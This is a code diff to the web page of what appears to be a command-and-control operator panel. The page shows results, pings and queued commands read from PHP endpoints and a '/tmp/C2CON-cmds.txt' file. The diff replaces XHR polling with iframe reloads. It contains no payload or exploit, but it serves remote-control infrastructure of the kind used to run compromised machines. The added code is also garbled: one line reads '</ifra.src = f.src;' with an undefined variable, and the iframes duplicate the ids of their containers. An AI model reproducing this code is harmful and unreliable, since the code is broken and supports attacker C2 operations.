@@ -230,56 +230,23 @@ file_put_contents('/tmp/C2CON-cmds.txt', '');
 function reloadres() {
 
 
-const xhr = new XMLHttpRequest();
-xhr.open('GET', 'readres.php', true);
-xhr.responseType = 'text';
-
-xhr.onload = () => {
-  if (xhr.readyState === xhr.DONE) {
-    if (xhr.status === 200) {
-      document.getElementById("res").innerHTML = xhr.responseText ;
-    }
-  }
-};
-
-xhr.send(null);
-setTimeout(reloadres, 2000);
+var r = document.getElementById('res');
+r.src = r.src;
+setTimeout(reloadres, 5000);
 }
 
 
 function reloadping() {
-const xhr = new XMLHttpRequest();
-xhr.open('GET', 'readping.php', true);
-xhr.responseType = 'text';
-
-xhr.onload = () => {
-  if (xhr.readyState === xhr.DONE) {
-    if (xhr.status === 200) {
-      document.getElementById("ping").innerHTML = xhr.responseText ;
-    }
-  }
-};
-
-xhr.send(null);
-setTimeout(reloadping, 2000);
+var p = document.getElementById('ping');
+p.src = p.src;
+setTimeout(reloadping, 5000);
   
 }
 
 function reloadcmds() {
-const xhr = new XMLHttpRequest();
-xhr.open('GET', 'readcmds.php', true);
-xhr.responseType = 'text';
-
-xhr.onload = () => {
-  if (xhr.readyState === xhr.DONE) {
-    if (xhr.status === 200) {
-      document.getElementById("cmds").innerHTML = xhr.responseText ;
-    }
-  }
-};
-
-xhr.send(null);
-setTimeout(reloadcmds, 2000);
+var c = document.getElementById('cmds');
+</ifra.src = f.src;
+setTimeout(reloadcmds, 5000);
   
 }
 
@@ -314,11 +281,11 @@ setTimeout(reloadcmds, 2000);
 <div style=" margin: 0 auto;">
 <div class="flex-body">
 <div class="flex-row">
-<div id="res" class="res"></div>
+<div id="res" class="res"><iframe src="readres.php" width=800 height=400 id="res"></iframe></div>
 </div>
 <div class="flex-column">
-<div id="ping" class="ping"></div>
-<div id="cmds" class="cmds"></div>
+<div id="ping" class="ping"><iframe src="readping.php" width=800 height=200 id="ping"></iframe></div>
+<div id="cmds" class="cmds"><iframe src="readcmds.php" width=800 height=200 id="cmds"></iframe></div>
 </div>
 </div>
 </div>
